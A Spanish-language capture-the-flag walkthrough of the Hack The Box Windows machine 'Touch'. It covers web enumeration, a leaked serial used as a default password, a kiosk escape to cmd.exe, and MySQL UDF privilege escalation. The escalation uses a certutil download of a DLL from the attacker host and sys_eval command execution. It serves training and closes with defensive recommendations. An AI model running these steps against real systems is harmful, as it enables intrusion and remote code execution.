
> [!info] Información de la máquina
> **Plataforma:** Hack The Box
> **Máquina:** Touch
> **OS:** Windows
> **Dificultad:** Easy
> **IP objetivo:** `10.129.191.180`
> **IP atacante:** `10.10.14.86` / `10.10.15.208`

> [!warning] ⚠️ Nota sobre la IP
> La instancia cambió de IP durante la sesión (`10.129.191.206` → `10.129.191.180`), probablemente por un reinicio tras inactividad. Usé `touch.htb` en `/etc/hosts` para no depender de la IP activa en cada comando.

---

## Resumen ejecutivo

Comprometí Touch de punta a punta explotando una cadena de fallos de diseño en un sistema de gestión de dispositivos de aeropuerto (Nexion DeviceHub) y en el kiosko de check-in que depende de él. Partí de una fuga de información no autenticada en `/api/status`, que expuso el número de serie del dispositivo — la contraseña por defecto documentada en el propio login. Desde el panel de administración recuperé credenciales de `KioskUser` enmascaradas solo visualmente, accedí por RDP a un kiosko de autoservicio en pantalla completa, y usando una pista cruzada de la máquina Layover (nombre + código de reserva) avancé en el flujo hasta forzar un error del lector de documentos. Ese error expuso un enlace externo que rompió el sandbox del kiosko, abriendo un Edge completo desde el cual lancé `cmd.exe` vía el diálogo nativo "Abrir archivo" de Windows, obteniendo shell como `KioskUser` y la flag de usuario.

Para la escalada, leí el código fuente del backend del kiosko y recuperé credenciales hardcodeadas de la base de datos (`kiosk_app`), con las que enumeré una tabla interna de staff con códigos de autenticación en texto plano. En paralelo, localicé la contraseña de `root` de MySQL en `C:\ProgramData\HTB Airways\`. Con privilegios de `root` en MySQL, confirmé `File_priv = Y` y un `plugin_dir` escribible, subí una DLL de UDF (`lib_mysqludf_sys_64.dll`) directamente por filesystem (bypaseando la restricción de `secure_file_priv`), registré una función `sys_eval` y ejecuté comandos arbitrarios en el contexto del servicio de MySQL — suficiente para leer `root.txt` en el escritorio de Administrator.

---

## 1. Reconocimiento

```bash
sudo nmap -p- -sSCV --min-rate 5000 -Pn 10.129.191.180 -oN scan_touch.txt
```

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-cors: GET POST PUT OPTIONS
|_http-title: Did not follow redirect to /login
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

| Puerto   | Servicio                    | Interpretación                                                         |
| -------- | --------------------------- | ----------------------------------------------------------------------- |
| 135/tcp  | msrpc                       | RPC endpoint mapper estándar de Windows. Confirma host Windows nativo. |
| 3389/tcp | ms-wbt-server               | RDP abierto. Vector de acceso, útil una vez con credenciales.          |
| 5985/tcp | WinRM                       | Alternativa a RDP si consigo credenciales válidas.                     |
| 8443/tcp | http, redirige a `/login` | Superficie de ataque principal. Aplicación web con autenticación.     |

Sin 445 (SMB) ni 389/88 (LDAP/Kerberos) — descarté controlador de dominio o unión a AD.

---

## 2. Enumeración web (puerto 8443)

### 2.1 Fingerprint de la aplicación

```bash
curl -sk http://10.129.191.206:8443/login
```

La app es **"Nexion DocReader / DeviceHub"**, subtítulo `DeviceHub DH-100 — Gate B7`. El login pide un único campo `password` (credencial de dispositivo, no de usuario). Un tooltip en "¿Olvidaste tu contraseña?" decía:

> *"The default password is the device serial number included in your DeviceHub packaging."*

Un botón **"Scan Staff Badge"** invocaba `fetch('/login/badge', {method:'POST'})` sin body. Lo probé con varios payloads (JSON vacío, `name`/`code`, form-urlencoded con `badge=`) y siempre obtuve el mismo error (`"No badge detected"`), lo que descarté como vector inmediato en ese momento.

### 2.2 Fuzzing de directorios

```bash
ffuf -u http://10.129.191.206:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 40 -c -mc 200,301,302,403
```

```
apm                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 162ms]
api                     [Status: 403, Size: 35, Words: 2, Lines: 1, Duration: 165ms]
```

El 403 en `/api` confirmó que el prefijo existe pero no es navegable directo — fuzzeé dentro de `/api` y llegué a `/api/status`.

### 2.3 Fuga de metadatos sin autenticación

![[Images/Touch/api_status_leak.png]]

```json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 17618
}
```

> [!success] Hallazgo clave
> Endpoint público sin autenticación expone el número de serie del dispositivo. Conectado con el tooltip del login: `password = NX-DH-2024-B7042`.

---

## 3. Acceso inicial

### 3.1 Login con contraseña por defecto

El serial filtrado funcionó como contraseña del panel de administración de Nexion DeviceHub.

### 3.2 Panel Scanner

![[Images/Touch/scanner_panel.png]]

El panel del scanner (Nexion DocReader SR-4200, serial `NX-SR-2024-0042`) mostraba credenciales enmascaradas con un link "show" — enmascarado puramente visual, sin petición adicional al servidor.

### 3.3 Credenciales expuestas — panel Printer

En el panel del Printer (Nexion TP-820, serial `NX-TP-2024-0042`), con el mismo mecanismo:

```
Username: KioskUser
Password: K!0sk2026#
```

### 3.4 Acceso RDP

```bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:touch.htb /cert:ignore
```

La sesión me dejó dentro de un kiosko de autoservicio de HTB Airways en pantalla completa, sin escritorio ni taskbar.

![[Images/Touch/kiosk_booking_search.png]]

---

## 4. Escape del kiosko

### 4.1 Pista cruzada de Layover

Con el dato obtenido en Layover (**Jenny Crawford / KS7X2M**), reconocí que `KS7X2M` tenía formato de referencia de reserva (6 alfanuméricos) y la usé en el buscador del kiosko:

- Referencia: `KS7X2M`
- Apellido: `CRAWFORD`

La búsqueda cargó y avancé a **Verificación de Documento**.

### 4.2 Forzando un error del lector

Al intentar escanear, apareció un diálogo de error de **Nexion DocReader SR-4200**:

![[Images/Touch/docreader_error_dialog.png]]

```
Error Code: SCN-ERR-4092
Device: NX-SR-2024-0042
https://support.nexionsystems.com/docreader/troubleshoot
```

> [!success] Hallazgo clave
> El diálogo de error de un componente de hardware de terceros contenía un hyperlink clicable fuera del control del kiosko principal — vector de escape por no heredar las restricciones de navegación del flujo normal.

### 4.3 Salida del sandbox

Al hacer clic se abrió un Edge completo, con barra de direcciones editable:

![[Images/Touch/browser_escape_edge.png]]

Navegué a `file:///C:/` para listar el sistema de archivos local:

![[Images/Touch/file_explorer_c_drive.png]]

Noté `MySQL/` en la raíz de `C:\` (instalación standalone de base de datos) y `ProgramData/` como candidatos para la fase de post-explotación.

### 4.4 Shell interactiva y user flag

Con `Ctrl+O` sobre Edge obtuve el diálogo nativo "Abrir archivo" de Windows. Escribí la ruta completa de un binario en el campo de nombre:

```
C:\Windows\System32\cmd.exe
```

Windows lo ejecutó directamente, dándome consola como `KioskUser`.

![[Images/Touch/cmd_shell_user_flag.png]]

```
C:\Users\KioskUser\Desktop>type user.txt
```

**User flag:** obtenida ✅

> [!note] ✏️ Nota de sesión
> Intenté `cat user.txt` por costumbre de Linux — `cmd.exe` no lo reconoce; el comando correcto es `type`.

---

## 5. Enumeración post-explotación

### 5.1 Verificación de privilegios

```cmd
whoami /priv
whoami /groups
```

```
SeChangeNotifyPrivilege       Enabled
SeUndockPrivilege              Disabled
SeIncreaseWorkingSetPrivilege  Disabled
SeTimeZonePrivilege            Disabled
```

Ningún privilegio explotable directamente (sin `SeImpersonate`, `SeBackup`, `SeDebug`, `SeTakeOwnership`). Descarté esa vía de escalada rápida.

En los grupos, llamó la atención uno local no estándar:

```
KIOSK-042\Printer Administrators    Alias
```

Lo anoté como hipótesis alternativa de privesc, sin explorarla — la vía de MySQL resultó más directa.

### 5.2 Scripts programados en ProgramData

```cmd
dir "C:\ProgramData" /s /b
```

Encontré, entre otros: `htb-backend.bat`, `htb-frontend.bat`, `KioskStartup.bat`, `NexionPrinter.bat` y un archivo `pwned.txt` que, al leerlo, devolvió solo `SYSTEM: DESKTOP-TH78LPV$` — lo descarté como ruido, no era una credencial ni parte de la cadena esperada.

Los `.bat` resultaron ser únicamente lanzadores de procesos (backend Node/TypeScript, frontend Vite, loop de relanzamiento del servicio de impresora) — **ninguno contenía credenciales**. La credencial debía estar en el código fuente que esos scripts ejecutan.

### 5.3 Credenciales de base de datos en el código fuente

```cmd
dir "C:\Program Files\HTB Airways\Kiosk\packages\backend\src" /s /b
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
```

El archivo define una función `loadConfig()` que intenta leer `C:\ProgramData\HTB Airways\db-config.ini` vía variable de entorno `DB_CONFIG_PATH`, y si falla, cae en un `catch` con credenciales hardcodeadas como fallback:

```typescript
const defaults = {
  host: "127.0.0.1",
  port: 3306,
  user: "kiosk_app",
  password: "K!0sk_R3pl1ca#DB",
  database: "htb_airways"
};
```

> [!tip] 💡 Principio de seguridad a documentar
> Un fallback de credenciales hardcodeado en el código fuente es una falla de diseño clásica: aunque exista un mecanismo "correcto" de configuración externa, si falta o no es legible, el sistema degrada silenciosamente a un secreto fijo embebido — accesible a cualquiera que pueda leer el archivo fuente.

### 5.4 Acceso a MySQL como `kiosk_app`

```cmd
mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 -e "SHOW DATABASES;"
```

```
+--------------------+
| Database           |
+--------------------+
| htb_airways        |
| information_schema |
| performance_schema |
+--------------------+
```

```cmd
mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SHOW TABLES;"
```

```
_htb_staff
_sync_metadata
boarding_passes
booking_passengers
bookings
checkin_log
document_scans
flights
passengers
seat_assignments
```

La tabla `_htb_staff` (prefijo `_` como convención de tabla interna) era la candidata obvia para credenciales de personal.

```cmd
mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "DESCRIBE _htb_staff;"
```

Confirmé una columna `auth_code varchar(64)` junto a `employee_id`, `email`, `role`, `department`, `active`.

```cmd
mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
```

Resultado: 32 cuentas de staff con `auth_code` en texto plano, roles desde `Gate Agent` hasta `Duty Manager` / `Station Manager`. No llegué a usar esta tabla para la escalada final — la vía de `root` de MySQL resultó más corta.

---

## 6. Escalada de privilegios — MySQL UDF Hijacking

### 6.1 Contraseña de root de MySQL

Localicé scripts adicionales en `C:\ProgramData\HTB Airways\` no explorados antes:

```cmd
dir "C:\ProgramData\HTB Airways" /s /b
```

```
C:\ProgramData\HTB Airways\db-config.ini
C:\ProgramData\HTB Airways\db-sync-replica.ps1
C:\ProgramData\HTB Airways\refresh-dates.bat
C:\ProgramData\HTB Airways\refresh-dates.sql
```

> [!warning] ⚠️ Pendiente de documentar con precisión
> No registré en esta sesión la salida exacta de `type refresh-dates.bat`. La contraseña de `root` de MySQL que usé a continuación (`HTB@irw4ys_DB!2026`) funcionó correctamente, lo que confirma que la obtuve de alguno de estos archivos — más probablemente `refresh-dates.bat`, dado que sigue el mismo patrón de script programado con credencial embebida visto en `database/index.ts`. Recomiendo re-ejecutar `type` sobre ese archivo para dejar la evidencia completa en esta nota.

### 6.2 Confirmación de privilegios de root

```cmd
mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, File_priv FROM mysql.user WHERE user='root';"
```

```
+------+-----------+-----------+
| user | host      | File_priv |
+------+-----------+-----------+
| root | localhost | Y         |
+------+-----------+-----------+
```

`File_priv = Y` es el prerrequisito para subir una librería de funciones definidas por el usuario (UDF).

### 6.3 Localización del directorio de plugins

```cmd
mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SHOW VARIABLES LIKE 'plugin_dir';"
```

```
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | C:\MySQL\lib\plugin\   |
+---------------+------------------------+
```

> [!tip] 💡 Lección técnica
> Nunca asumí esta ruta de un write-up externo — la confirmé consultando directamente la variable en mi propia instancia. `CREATE FUNCTION ... SONAME` solo busca el archivo dentro del `plugin_dir` configurado; usar una ruta distinta produce `errno: 126 The specified module could not be found`, error que efectivamente obtuve en un primer intento antes de corregir la ruta de destino del `certutil`.

### 6.4 Subida de la DLL UDF

`secure_file_priv` estaba en `NULL`, bloqueando `SELECT ... INTO OUTFILE`. Como ya tenía shell con acceso al sistema de archivos, subí la DLL directamente, sin pasar por MySQL:

```bash
# En Kali, sirviendo el archivo por HTTP
python3 -m http.server 8000
```

```cmd
certutil -urlcache -split -f http://10.10.15.208:8000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

### 6.5 Registro de la función

```cmd
mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
```

Con la ruta correcta ya confirmada, el registro se completó sin errores.

### 6.6 Root flag

```cmd
mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT CONVERT(sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt') USING utf8);"
```

![[Images/Touch/mysql_udf_privesc_root.png]]

**Root flag:** obtenida ✅ (no se documenta el valor completo por política del proyecto).

> [!note] ✏️ Validación pendiente de documentar
> No ejecuté explícitamente `sys_eval('whoami')` antes de leer `root.txt` para confirmar el contexto exacto de ejecución (`nt authority\system` o la cuenta de servicio de MySQL). El acceso de lectura al escritorio de `Administrator` es evidencia fuerte de privilegio elevado, pero para una nota completa recomiendo correr ese `whoami` y registrar el resultado.

---

## 7. Errores y cómo los resolví

| Error                                                                      | Causa                                                                                                                 | Solución                                                                                                                    |
| -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `mysql.exe` imprimía el texto de ayuda en vez de conectar               | Escribí `-p` con espacio antes de la contraseña (`-p k!0sk...`), rompiendo el parsing de flags                  | `-p` debe ir pegado al valor: `-pMiClave`, sin espacio                                                                   |
| `Access denied for user 'kiosk_app'@'localhost'`                         | Transcribí la contraseña con minúscula (`k!0sk...`) en vez de la `K` mayúscula real del código fuente        | Copiar la credencial exacta desde la fuente, no re-teclearla de memoria                                                      |
| `No database selected` en `SHOW TABLES;`                               | Cada invocación de `mysql.exe -e` es una conexión nueva; un `USE` en una invocación no persiste a la siguiente | Nombrar la base como argumento posicional (`mysql.exe ... htb_airways -e "..."`) o encadenar sentencias en un mismo `-e` |
| `errno: 126 The specified module could not be found` al registrar la UDF | Subí la DLL a una ruta que no coincidía con el `plugin_dir` real                                                  | Confirmar la ruta con `SHOW VARIABLES LIKE 'plugin_dir';` antes de subir el archivo, nunca asumirla                        |

---

## 8. Lecciones aprendidas

- Un endpoint de "status" o "health check" sin autenticación puede filtrar identificadores que funcionan como credenciales por defecto.
- El enmascarado de contraseñas solo a nivel visual (CSS/JS) no protege nada; el valor real ya viaja en el HTML/DOM.
- Los diálogos de error de componentes de terceros dentro de un kiosko pueden no heredar las restricciones de navegación del flujo principal — superficie de escape real y poco intuitiva.
- El diálogo nativo "Abrir archivo" de Windows ejecuta binarios directamente si se le da una ruta completa, sin control de la aplicación que lo invocó.
- Un fallback de credenciales hardcodeado en código fuente es tan explotable como un archivo de configuración expuesto, si el código es legible por el usuario que ejecuta la app.
- Scripts programados (`.bat`/`.ps1`) en `ProgramData` son un vector recurrente de fuga de credenciales con privilegios más altos que la cuenta que los lee.
- `File_priv = Y` + `plugin_dir` escribible en MySQL es suficiente para RCE vía UDF hijacking, incluso con `secure_file_priv = NULL`, si ya se cuenta con acceso de filesystem para subir la librería por fuera de MySQL.

---

## 9. Recomendaciones defensivas

- No exponer identificadores de dispositivo (número de serie) en endpoints sin autenticación, y nunca derivar contraseñas por defecto de datos públicamente descubribles.
- Eliminar el enmascarado de contraseñas puramente visual; si debe mostrarse, debe requerir una petición autenticada al servidor en el momento del "show".
- Restringir la navegación de diálogos de error de componentes de terceros dentro de entornos kiosko (modo quiosco a nivel de SO, no solo a nivel de aplicación web).
- No usar credenciales hardcodeadas como fallback en código fuente; fallar de forma segura (rechazar conexión) si la configuración externa no está disponible.
- Restringir permisos de escritura sobre `plugin_dir` de MySQL únicamente a la cuenta de servicio de MySQL.
- Rotar y centralizar credenciales de servicio fuera de scripts `.bat`/`.ps1` en texto plano.

---

## Herramientas usadas

nmap · curl · ffuf · xfreerdp · certutil · mysql.exe · Metasploit (`lib_mysqludf_sys_64.dll`)
